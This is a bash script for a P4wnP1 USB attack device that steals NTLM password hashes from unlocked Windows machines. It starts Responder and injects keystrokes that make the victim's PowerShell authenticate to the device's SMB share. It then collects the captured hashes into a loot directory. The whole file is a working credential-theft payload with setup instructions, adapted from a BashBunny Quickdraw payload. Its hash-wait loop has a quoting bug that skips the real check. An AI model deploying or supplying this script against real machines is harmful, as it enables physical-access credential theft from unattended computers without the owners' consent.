#!/bin/bash

# Steal hashes from unlocked Windows machines
# Based on golem445 BashBunny Quickdraw: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/Quickdraw
# You need to have responder installed: "apt-get install responder"
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID Keyboard.
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger that starts the bash script "Quickdraw.sh" when DHCP lease issued

RESPONDER_OPTIONS=" -w -r -d -P -F -v"
LOOTDIR=/usr/local/P4wnP1/www/loot/quickdraw
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');

echo "[*] Checking if responder installed..."
if [ ! -f /root/Responder/Responder.py ]; then
    echo "[!] Responder not found!"
    exit 1
  fi

echo "[*] Killing Responder..."
process=$(ps aux | grep 'Responder' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'Responder' with PID $pid has been terminated."
else
    echo "No 'Responder' process found."
fi

echo "[*] Clearing responder logs directory..."
rm -f /root/Responder/logs/* 2>/dev/null
rm -f /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js 2>/dev/null

echo "[*] Creating loot dir..."
mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT
mkdir -p /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT

if [ -z "$TARGET_IP" ]; then
	exit 1
fi

echo "[*] Starting responder..."
python2 /root/Responder/Responder.py -I usbeth $RESPONDER_OPTIONS &
#responder -I usbeth &

sleep 5

# Create P4wnP1 HID script

echo "layout(\"us\")" > /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "press(\"GUI r\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "delay(250)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "type(\"powershell \\\\\\\172.16.0.1\\\s\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "delay(250)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "delay(250)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "type(\"exit\n\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "delay(250)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js

# Execute P4wnP1 HID script

P4wnP1_cli hid run -n Quickdraw_win.js >/dev/null

sleep 10

while ! [ "-f /root/Responder/logs/*NTLM*" ];
do
    echo "[*] Waiting for hashes..."
    sleep 1
done

echo "[+] Hashes captured!"
echo "[*] Copying responder data to loot directory..."
cp /root/Responder/logs/* /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT
cp /root/Responder/logs/* $LOOTDIR/$HOST-$COUNT
echo "[*] Clearing responder logs directory..."
rm -f /root/Responder/logs/* 2>/dev/null
echo "[*] Killing Responder..."

echo "[*] Killing Responder..."
process=$(ps aux | grep 'Responder' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'Responder' with PID $pid has been terminated."
else
    echo "No 'Responder' process found."
fi

rm -f /usr/local/P4wnP1/HIDScripts/Quickdraw_win.js 2>/dev/null
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null